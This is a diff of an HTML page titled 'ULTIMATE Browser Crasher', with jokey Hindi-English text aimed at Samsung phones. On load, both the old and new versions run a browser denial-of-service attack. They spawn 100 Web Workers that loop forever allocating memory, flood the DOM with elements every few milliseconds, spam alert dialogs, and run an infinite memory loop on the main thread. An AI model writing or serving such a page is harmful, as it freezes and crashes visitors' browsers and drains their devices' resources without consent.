@@ -1,53 +1,53 @@
 <!DOCTYPE html>
 <html>
   <head>
-    <title>Ultimate Browser Killer</title>
+    <title>ULTIMATE Browser Crasher</title>
     <script>
-      function createUltraCrasher() {
-        const blob = new Blob([`
-          onmessage = function() {
+      // Worker creator
+      function createCrasherWorker() {
+        const blob = new Blob([
+          `onmessage = function() {
             while (true) {
-              let data = [];
-              for (let i = 0; i < 100000; i++) {
-                data.push(Math.random());
-              }
+              let arr = new Array(1000000).fill(Math.random());
             }
-          }
-        `], { type: 'application/javascript' });
+          }`
+        ], { type: 'application/javascript' });
 
         const worker = new Worker(URL.createObjectURL(blob));
-        worker.postMessage('start');
+        worker.postMessage('go');
       }
 
-      function spamDOM() {
+      function startDoom() {
+        // DOM Bombing
         setInterval(() => {
-          let div = document.createElement("div");
-          div.innerText = "Samsung is worst company ever! Crash incoming!";
-          document.body.appendChild(div);
-        }, 1);
+          const el = document.createElement('div');
+          el.innerText = "Samsung worst company ever!";
+          el.style.fontSize = '50px';
+          document.body.appendChild(el);
+        }, 10);
+
+        // Alert Spam
+        setInterval(() => {
+          alert("Samsung lagged again!");
+        }, 200);
+
+        // Spawn Web Workers
+        for (let i = 0; i < 100; i++) {
+          createCrasherWorker();
+        }
+
+        // Main Thread infinite memory hog
+        while (true) {
+          let arr = new Array(1000000).fill("Samsung is the worst");
+          console.log("Crashing...");
+        }
       }
 
-      window.onload = function () {
-        // DOM Spam
-        spamDOM();
-
-        // Create 100 heavy workers
-        for (let i = 0; i < 100; i++) {
-          createUltraCrasher();
-        }
-
-        // Main thread infinite RAM hog
-        let arr = [];
-        while (true) {
-          for (let i = 0; i < 10000; i++) {
-            arr.push(new Array(1000).fill("Samsung = Lag!"));
-          }
-        }
-      };
+      window.onload = startDoom;
     </script>
   </head>
   <body>
-    <h1>BHAI! Yeh Samsung ka phone gaya kaam se!</h1>
-    <p>Browser... Battery... Sabko bye bol de!</p>
+    <h1>Bro... tumne khud ke browser ko MAR diya!</h1>
+    <p>Samsung ka naam sunte hi crash ho gaya kya?</p>
   </body>
 </html>
